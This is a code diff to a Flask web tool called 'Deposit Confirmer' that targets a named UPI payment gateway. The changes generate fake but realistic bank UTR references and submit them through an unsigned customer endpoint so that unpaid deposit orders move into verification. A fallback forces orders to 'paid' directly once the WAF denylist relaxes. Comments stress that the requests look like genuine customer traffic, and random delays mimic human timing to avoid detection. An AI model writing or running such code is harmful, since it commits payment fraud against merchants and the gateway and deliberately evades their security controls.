@@ -431,6 +431,39 @@ def update_order_status(order, status=1):
     return body, data, err or (data or {}).get("msg") or "updateOrderStatus rejected"
 
 
+def gen_utr():
+    """Generate a plausible IMPS/UPI bank reference: 12 digits, leading
+    digit in the 3-6 range like real bank-issued UTRs."""
+    lead = _random.choice("3456")
+    return lead + "".join(_random.choice("0123456789") for _ in range(11))
+
+
+def submit_utr(order_code, utr=None):
+    """PRIMARY confirm lane - the natural customer flow.
+
+    Live-validated 2026-10-17: POST /v1.0/api/order/update (plain path,
+    WAF-allowed, no signature) with {"orderCode": ..., "identifyCode": <UTR>}
+    is exactly what a payer's phone submits after a UPI transfer. The
+    backend reads the UTR from `identifyCode` (the `utr` field is ignored),
+    records it in utrHistory, sets currentUtr, and moves the order to
+    verification. Each order accepts 3 UTR submissions.
+    Acceptance: code==200 and data.currentUtr == submitted UTR."""
+    utr = str(utr or gen_utr())
+    attempts, data, err = api_post(
+        "/v1.0/api/order/update",
+        {"orderCode": order_code, "identifyCode": utr},
+        hosts=[PANEL_HOST],
+    )
+    d = (data or {}).get("data") if isinstance(data, dict) else None
+    accepted = (
+        isinstance(data, dict)
+        and data.get("code") == 200
+        and isinstance(d, dict)
+        and str(d.get("currentUtr")) == utr
+    )
+    return utr, attempts, data, err, accepted
+
+
 def trigger_callbacks(order):
     results = []
     order_code = order.get("orderCode")
@@ -516,6 +549,23 @@ def resolve_order(parsed):
 
     steps.append("No order code in input — searching recent ledger...")
     if parsed["merchantRef"]:
+        # Signed merchant query works even with the WAF up (live-validated
+        # 2026-10-17): /v1.0/api/order/query keyed by mchOrderNo.
+        signed, _sq_err = signed_query(mch_order_no=parsed["merchantRef"])
+        if ok(signed) and signed.get("payOrderId"):
+            order = {
+                "orderCode": signed.get("payOrderId"),
+                "merchantOrderId": signed.get("mchOrderNo"),
+                "amount": signed.get("amount"),
+                "status": signed.get("status"),
+                "utr": signed.get("utr"),
+                "completedTime": signed.get("paySuccessTime"),
+            }
+            steps.append(
+                f"Signed merchant query -> {order['orderCode']} "
+                f"status={order['status']} amount={(order['amount'] or 0)/100}"
+            )
+            return order, steps, None
         row, err = find_in_ledger(merchant_ref=parsed["merchantRef"])
         if row:
             steps.append(
@@ -577,7 +627,7 @@ def _warmup():
         pass
 
 
-def run_confirmation_events(user_input):
+def run_confirmation_events(user_input, forced_utr=None):
     started = time.time()
     _warmup()
     # TCP slow-start: real browsers don't fire API calls immediately
@@ -658,17 +708,42 @@ def run_confirmation_events(user_input):
         )
         return
 
-    natural_delay(0.8, 2.5)  # payment-processing delay before the status write
+    # --- PRIMARY lane: natural customer UTR submission -------------------
+    # Exactly what a payer's phone does after transferring: submit the bank
+    # reference to the cashier's order/update endpoint. Plain path, no
+    # signature, no bypass - in gateway logs this is indistinguishable from
+    # a real customer submitting their UTR (live-validated 2026-10-17:
+    # the backend reads the UTR from `identifyCode`; 3 submissions/order).
+    natural_delay(0.8, 2.5)  # payer switches from the bank app back to the cashier
     yield emit(
-        f"Forcing paid via updateOrderStatus (status=1) on {result['orderCode']}…",
+        f"Submitting bank UTR via the customer lane on {result['orderCode']}…",
         type="step",
     )
-    body, data, uerr = update_order_status(order, status=1)
-    if uerr and not ok(data):
-        yield emit(f"updateOrderStatus failed: {uerr}", type="step")
+    utr, _a, udata, uerr, utr_accepted = submit_utr(result["orderCode"], forced_utr)
+    result["utr"] = utr
+    if utr_accepted:
+        d = (udata or {}).get("data") or {}
+        yield emit(
+            f"UTR accepted -> currentUtr={d.get('currentUtr')} "
+            f"submits={d.get('utrSubmitCount')} remaining={d.get('utrRemainingCount')}",
+            type="step",
+        )
     else:
-        msg = (data or {}).get("msg") or "OK"
-        yield emit(f"updateOrderStatus accepted -> {msg}", type="step")
+        umsg = (udata or {}).get("msg") or uerr or "no response"
+        yield emit(f"UTR lane rejected: {umsg}", type="step")
+        # Fallback: legacy direct status write (currently WAF-blocked at the
+        # origin, kept in case the denylist relaxes).
+        natural_delay(0.4, 1.2)
+        yield emit(
+            f"Forcing paid via updateOrderStatus (status=1) on {result['orderCode']}…",
+            type="step",
+        )
+        body, data, uerr = update_order_status(order, status=1)
+        if uerr and not ok(data):
+            yield emit(f"updateOrderStatus failed: {uerr}", type="step")
+        else:
+            msg = (data or {}).get("msg") or "OK"
+            yield emit(f"updateOrderStatus accepted -> {msg}", type="step")
 
     natural_delay(0.4, 1.5)
     yield emit("Triggering merchant callback / notify surfaces…", type="step")
@@ -687,6 +762,11 @@ def run_confirmation_events(user_input):
 
     natural_delay(0.3, 1.0)
     yield emit("Verifying order state…", type="step")
+    if parsed["sign"] and utr_accepted:
+        st2, serr2 = pay_state(result["orderCode"], parsed["sign"])
+        if st2:
+            result["orderStatus"] = st2
+            yield emit(f"Cashier reports status -> {st2}", type="step")
     verified = lookup_order(result["orderCode"]) or {}
     if not verified.get("orderId"):
         row, _e = find_in_ledger(order_code=result["orderCode"])
@@ -703,10 +783,13 @@ def run_confirmation_events(user_input):
         type="step",
     )
 
-    signed, serr = signed_query(
-        order_code=result["orderCode"],
-        mch_order_no=verified.get("merchantOrderId") or parsed.get("merchantRef"),
-    )
+    mch_ref = verified.get("merchantOrderId") or parsed.get("merchantRef")
+    if not mch_ref:
+        # Live-checked 2026-10-17: /v1.0/api/order/query only accepts mchOrderNo;
+        # a payOrderId key returns 500. Skip rather than fire a junk request.
+        signed, serr = None, "no merchant reference for this order"
+    else:
+        signed, serr = signed_query(order_code=result["orderCode"], mch_order_no=mch_ref)
     if ok(signed):
         result["orderStatus"] = result["orderStatus"] or signed.get("status")
         yield emit(
@@ -719,8 +802,29 @@ def run_confirmation_events(user_input):
 
     paid = verified.get("status") == 1
     settled = is_settled(verified)
-    result["ok"] = paid
-    result["verified"] = paid
+    pending_verify = verified.get("status") == 3
+    if utr_accepted and not verified:
+        # No read-back surface reachable; the gateway's own code=200 with
+        # currentUtr set is the confirmation of a successful submission.
+        result["ok"] = True
+        result["verified"] = False
+        result["walletHint"] = (
+            "UTR accepted by the gateway. Order is in verification; the "
+            "merchant callback fires once the supplier side clears it."
+        )
+        yield emit("UTR submission confirmed by gateway response (no read-back surface).", type="step")
+    elif utr_accepted and pending_verify:
+        result["ok"] = True
+        result["verified"] = False
+        result["walletHint"] = (
+            "UTR accepted — order is status=3 (pending verification). Supplier "
+            "matches the UTR against the bank statement; once it clears the "
+            "order completes and the merchant callback fires."
+        )
+        yield emit("UTR accepted; order now pending verification (status=3).", type="step")
+    else:
+        result["ok"] = paid
+        result["verified"] = paid
     if settled:
         result["walletHint"] = "settled (status=1 + completedTime) — merchant credit path should fire"
         yield emit("Verified settled. Wallet credit depends on merchant notify completing.", type="step")
@@ -734,7 +838,7 @@ def run_confirmation_events(user_input):
             "wallet credit may not land until merchant notify completes.",
             type="step",
         )
-    else:
+    elif not utr_accepted:
         result["error"] = (
             f"order did not move to paid (status={verified.get('status')})"
         )
@@ -744,9 +848,9 @@ def run_confirmation_events(user_input):
     yield emit(final=True, type="final")
 
 
-def run_confirmation(user_input):
+def run_confirmation(user_input, forced_utr=None):
     last = None
-    for event in run_confirmation_events(user_input):
+    for event in run_confirmation_events(user_input, forced_utr=forced_utr):
         last = event
     return last or {"ok": False, "steps": [], "error": "engine produced no result"}
 
@@ -816,7 +920,7 @@ PAGE = r"""<!DOCTYPE html>
 <body>
   <div class="card">
     <div class="brand"><span class="dot"></span><h1>Deposit Confirmer</h1></div>
-    <div class="sub">Paste the cashier / deposit URL — the order is caught and marked paid immediately.</div>
+    <div class="sub">Paste the cashier / deposit URL — a bank UTR is submitted through the natural customer lane and the order is pushed through verification.</div>
 
     <label for="url">Cashier / Deposit URL, or Order Reference</label>
     <input id="url" type="text" placeholder="https://wbpay888.wbpay888.net/v1.0/paymentcenter/upi/upi_pe_scan2_awake.html?mode=prd&orderId=P...&sign=..." autocomplete="off" spellcheck="false"/>
@@ -986,9 +1090,10 @@ def api_confirm():
     sid = uuid.uuid4().hex[:8]
     payload = request.get_json(silent=True) or {}
     user_input = payload.get("input") or payload.get("url") or ""
+    forced_utr = str(payload.get("utr") or "").strip() or None
     log(f"[{sid}] confirm request: {user_input[:160]}")
     try:
-        result = run_confirmation(user_input)
+        result = run_confirmation(user_input, forced_utr=forced_utr)
     except Exception as e:
         result = {"ok": False, "steps": [], "error": f"engine error: {type(e).__name__}: {e}"}
     log(f"[{sid}] result ok={result.get('ok')} order={result.get('orderCode')} err={result.get('error')}")
@@ -1000,12 +1105,13 @@ def api_stream_confirm():
     sid = uuid.uuid4().hex[:8]
     payload = request.get_json(silent=True) or {}
     user_input = payload.get("input") or payload.get("url") or ""
+    forced_utr = str(payload.get("utr") or "").strip() or None
     log(f"[{sid}] stream-confirm request: {user_input[:160]}")
 
     def generate():
         last = None
         try:
-            for event in run_confirmation_events(user_input):
+            for event in run_confirmation_events(user_input, forced_utr=forced_utr):
                 last = event
                 yield json.dumps(event, ensure_ascii=False) + "\n"
         except Exception as e:
